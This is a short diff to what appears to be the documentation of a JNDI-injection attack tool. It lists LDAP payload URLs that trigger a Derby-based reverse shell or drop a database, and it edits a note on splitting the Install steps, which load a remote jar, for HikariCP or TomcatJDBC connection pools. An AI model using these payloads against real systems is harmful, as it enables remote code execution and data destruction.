@@ -260,7 +260,7 @@ ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0
 ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
 ```
 
-Please note that the connectionInitSql parameter of HikariCP does not support executing multiple SQL statements at once, so the **Install** process above needs to be written separately
+Please note that the connectionInitSql/initSQL parameter of HikariCP/TomcatJDBC does not support executing multiple SQL statements at once, so the **Install** process above needs to be written separately, taking HikariCP as an example
 
 ```bash
 # 1. load remote jar (will automatically create the database)
